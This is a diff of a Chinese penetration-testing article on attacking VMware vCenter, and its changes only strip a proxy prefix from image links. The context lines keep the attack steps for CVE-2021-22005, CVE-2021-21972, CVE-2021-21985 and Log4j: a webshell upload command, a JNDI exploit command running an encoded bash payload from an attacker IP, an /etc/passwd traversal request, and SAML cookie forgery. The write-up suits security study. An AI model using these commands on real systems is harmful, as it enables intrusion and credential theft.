@@ -14,14 +14,14 @@ ___发表于_
 
 收录于合集
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20221207152827.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20221207152827.png)
 
 由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，雷神众测及文章作者不为此承担任何责任。
 
 雷神众测拥有对此文章的修改和解释权。如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经雷神众测允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。
 
   
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20221207152841.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20221207152841.png)
 
 查看版本信息
 
@@ -31,7 +31,7 @@ ___发表于_
 
   
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20221207152841.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20221207152841.png)
 
 cve-2021-22005
 
@@ -53,11 +53,11 @@ cve-2021-22005
     
     python3 .\exp.py -t https://192.168.52.152 -s api_all_jdk.jsp
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20221207152844.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20221207152844.png)
 
 连接木马，默认路径/storage/db/vmware-vmdir/data.mdb
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20221207152845.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20221207152845.png)
 
  **2.vcenter_saml_login**
 
@@ -72,7 +72,7 @@ db数据库存放位置
 拖到本地利用：vcenter_saml_login  
 配置cmd代理，利用netch到本地127.0.0.1:1080
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20221207152847.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20221207152847.png)
 
     
     
@@ -80,11 +80,11 @@ db数据库存放位置
 
 修改cookie进行连接
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20221207152848.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20221207152848.png)
 
   
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20221207152841.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20221207152841.png)
 
 CVE-2021-21972
 
@@ -121,7 +121,7 @@ CVE-2021-21972
     https://x.x.x.x/statsreport/gsl.jsp  
     C:/ProgramData/VMware/vCenterServer/data/perfcharts/tc-instance/webapps/statsreport
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20221207152850.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20221207152850.png)
 
  **2\. linux机器**
 
@@ -133,11 +133,11 @@ CVE-2021-21972
 
 遍历写shell（时间较久）
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20221207152852.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20221207152852.png)
 
   
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20221207152841.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20221207152841.png)
 
 CVE-2021-21985
 
@@ -151,7 +151,7 @@ CVE-2021-21985
 
   
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20221207152841.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20221207152841.png)
 
 Log4j
 
@@ -165,11 +165,11 @@ ${jndi:ldap://exp}
       
     java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,base编码内容}|{base64,-d}|{bash,-i}" -A "ip"
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20221207152856.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20221207152856.png)
 
   
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20221207152841.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20221207152841.png)
 
 vmware未授权任意文件读取漏洞
 
@@ -186,11 +186,11 @@ vmware未授权任意文件读取漏洞
     # linux  
     /eam/vib?id=/etc/passwd
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20221207152858.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20221207152858.png)
 
   
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20221207152841.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20221207152841.png)
 
 vCenter低权限账户提权思路
 
@@ -278,13 +278,13 @@ vCenter低权限账户提权思路
 
   
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20221207152841.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20221207152841.png)
 
 后续
 
  **创建快照**
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20221207152902.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20221207152902.png)
 
 分析快照文件需要.vmem文件作为参数，而.vmem文件通常很大，为了提高效率，这里选择将volatility上传至VMware ESXI，在VMware
 ESXI上分析快照文件。
@@ -351,11 +351,11 @@ http://downloads.volatilityfoundation.org/releases/2.6/volatility_2.6_lin64_stan
 
 重大活动网络安保支撑单位
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20221207152904.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20221207152904.png)
 
 END
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20221207152905.png)![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20221207152906.png)![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20221207152907.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20221207152905.png)![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20221207152906.png)![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20221207152907.png)
 
  **长按识别二维码关注我们**
 
